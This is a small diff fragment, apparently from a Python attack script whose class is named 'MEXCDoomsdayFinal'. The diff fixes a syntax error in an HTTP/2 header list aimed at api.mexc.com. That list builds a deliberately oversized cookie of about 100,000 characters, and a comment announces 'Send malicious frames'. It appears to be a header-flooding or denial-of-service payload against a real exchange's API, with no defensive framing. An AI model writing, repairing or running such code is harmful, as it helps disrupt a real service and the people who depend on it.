@@ -123,7 +123,7 @@ class MEXCDoomsdayFinal:
                         (':method', 'GET'),
                         (':path', '/'),
                         (':authority', 'api.mexc.com'),
-                        ('cookie', '; '.join([f'{i}=a'*1000 for i in range(100)])
+                        ('cookie', '; '.join([f'{i}=a'*1000 for i in range(100)]))
                     ]
                     
                     # Send malicious frames
